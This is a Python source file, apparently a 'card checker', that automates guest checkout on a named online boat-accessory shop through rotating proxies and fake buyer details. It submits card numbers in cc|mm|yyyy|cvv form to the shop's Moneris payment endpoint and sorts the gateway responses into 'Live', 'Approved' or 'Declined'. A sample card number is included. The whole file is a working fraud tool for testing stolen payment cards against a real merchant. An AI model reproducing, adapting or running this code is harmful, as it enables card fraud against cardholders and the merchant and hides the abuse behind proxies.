import requests
from retry import retry
from proxys.proxy import get_random_proxy  # Importamos la función desde proxys/proxy.py

class MonerisAuth:
    def __init__(self):
        self.session = requests.Session()
        self.current_proxy = None

    def set_proxy(self):
        """Configura un nuevo proxy para la sesión."""
        self.current_proxy = get_random_proxy()
        if self.current_proxy:
            self.session.proxies = self.current_proxy
            print(f"DEBUG: Usando proxy: {self.current_proxy['http']}")
        else:
            self.session.proxies = {}
            print("DEBUG: No hay proxies disponibles, usando conexión directa")

    @retry(tries=3, delay=1, backoff=2)
    def main(self, card):
        try:
            # Configurar un nuevo proxy para este intento
            self.set_proxy()

            cc = card.split("|")
            if len(cc) != 4:
                return 'Declined! ❌', 'Invalid card format - Expected cc|mm|yyyy|cvv'

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Accediendo a la página del producto")
            response = self.session.get('https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html', headers=headers, timeout=10)
            print(f"DEBUG: Status página producto: {response.status_code}")

            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://innovoceans.com',
                'referer': 'https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Agregando producto al carrito")
            response = self.session.post('https://innovoceans.com/index.php?route=checkout/cart/add', headers=headers, data={'quantity': '1', 'product_id': '744'}, timeout=10)
            print(f"DEBUG: Status agregar carrito: {response.status_code}")

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Accediendo al checkout")
            response = self.session.get('https://innovoceans.com/index.php?route=checkout/checkout', headers=headers, timeout=10)
            print(f"DEBUG: Status checkout: {response.status_code}")

            headers = {
                'referer': 'https://innovoceans.com/index.php?route=checkout/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Configurando checkout como invitado")
            response = self.session.get('https://innovoceans.com/index.php?route=checkout/guest', headers=headers, timeout=10)
            print(f"DEBUG: Status guest: {response.status_code}")

            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://innovoceans.com',
                'referer': 'https://innovoceans.com/index.php?route=checkout/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            data = {
                'customer_group_id': '1',
                'firstname': 'Lucas',
                'lastname': 'Lorenzo',
                'email': 'valerie.jenkins@gmail.com',
                'telephone': '8194544131',
                'fax': '',
                'company': 'OrganiMp',
                'address_1': 'E Little York Rd 7912',
                'address_2': '',
                'city': 'Norman',
                'postcode': '10010',
                'country_id': '223',
                'zone_id': '3624',
                'shipping_address': '1',
            }
            print("DEBUG: Guardando datos de invitado")
            response = self.session.post('https://innovoceans.com/index.php?route=checkout/guest/save', headers=headers, data=data, timeout=10)
            print(f"DEBUG: Status guest save: {response.status_code}")

            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://innovoceans.com',
                'referer': 'https://innovoceans.com/index.php?route=checkout/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Guardando método de envío")
            response = self.session.post('https://innovoceans.com/index.php?route=checkout/shipping_method/save', headers=headers, data={'shipping_method': 'pickup.pickup', 'comment': ''}, timeout=10)
            print(f"DEBUG: Status shipping method: {response.status_code}")

            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://innovoceans.com',
                'referer': 'https://innovoceans.com/index.php?route=checkout/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Guardando método de pago")
            response = self.session.post('https://innovoceans.com/index.php?route=checkout/payment_method/save', headers=headers, data={'payment_method': 'moneris', 'comment': '', 'agree': '1'}, timeout=10)
            print(f"DEBUG: Status payment method: {response.status_code}")

            headers = {
                'referer': 'https://innovoceans.com/index.php?route=checkout/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            print("DEBUG: Confirmando checkout")
            response = self.session.get('https://innovoceans.com/index.php?route=checkout/confirm', headers=headers, timeout=10)
            print(f"DEBUG: Status confirm: {response.status_code}")

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://innovoceans.com',
                'referer': 'https://innovoceans.com/index.php?route=checkout/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            data = {
                'number': cc[0],
                'cvc': cc[3],
                'exp_month': cc[1],
                'exp_year': cc[2],
                'card_name': 'Mario Lopez',
                'card_address': 'E Little York Rd 7912',
                'card_zip': '10010',
                'card_type': 'visa' if cc[0].startswith('4') else 'mastercard' if cc[0].startswith('5') else 'amex' if cc[0].startswith('3') else 'discover'
            }
            print("DEBUG: Enviando datos de pago a Moneris")
            response = self.session.post('https://innovoceans.com/index.php?route=payment/moneris/send', headers=headers, data=data, timeout=10)
            print(f"DEBUG: Respuesta de Moneris - Status: {response.status_code}, Contenido: {response.text[:500]}")

            if '{"error"' in response.text: 
                error_msg = response.json()['error']
                if '"DECLINED           * REFER CALL TO ISSUE=' in response.text:
                    return 'Live! ✅', 'DECLINED - Call Issuer'
                elif 'Invalid Card CVV' in response.text:
                    return 'Live! ✅', 'Invalid CVV (Live CC)'
                elif 'Name, Address or CVV code is incorrect.' in response.text:
                    return 'Live! ✅', 'AVS/CVV Mismatch (Live CC)'
                return 'Declined! ❌', error_msg
            else:
                return 'Approved! ✅', 'Charged $80.00'
        
        except requests.exceptions.Timeout as e:
            print(f"❌ Error de timeout: {e}")
            return 'Declined! ❌', 'Gateway Rejected: timeout'
        except Exception as e:
            print(f"❌ Error general en MonerisAuth.main: {e}")
            return 'Declined! ❌', 'Gateway Rejected: connection_failed'
        finally:
            self.session.close()

# Ejemplo de uso standalone
if __name__ == "__main__":
    card = "4555113008887574|09|2025|967"
    moneris = MonerisAuth()
    result = moneris.main(card)
    print(result)